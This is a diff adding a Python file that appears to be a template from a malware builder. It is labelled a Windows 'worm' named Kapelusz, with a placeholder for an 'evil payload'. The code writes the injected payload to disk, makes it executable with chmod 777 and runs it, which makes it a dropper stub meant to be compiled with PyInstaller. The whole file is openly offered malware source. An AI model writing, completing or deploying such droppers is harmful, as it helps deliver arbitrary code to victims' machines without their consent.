@@ -1,0 +1,35 @@
+#!name##Kapelusz
+#!itemType##worm
+#!info##Python Worm with payload space
+#!lang##Python
+#!itemTags##WIN
+#!Wprocess##BasicPy
+#!wormCompiler##PyInstaller
+#!payloadSpace##KPAY##My first evil payload
+
+import os
+
+class Kapelusz:
+    def __init__(self):
+        self.payload = {{KPAY}}
+    
+    def save_payload(self) -> None:
+        try:
+            with open("./payload", "wb") as file:
+                file.write(self.payload)
+        except Exception as e:
+            print("ERROR Write payload")
+    
+
+    def execute_payload(self) -> None:
+        os.system("chmod 777 ./payload")
+        os.system("./payload")
+    
+    def START(self) -> None:
+        self.save_payload()
+        self.execute_payload()
+
+if __name__ == "__main__":
+    kk = Kapelusz()
+    kk.START()
+
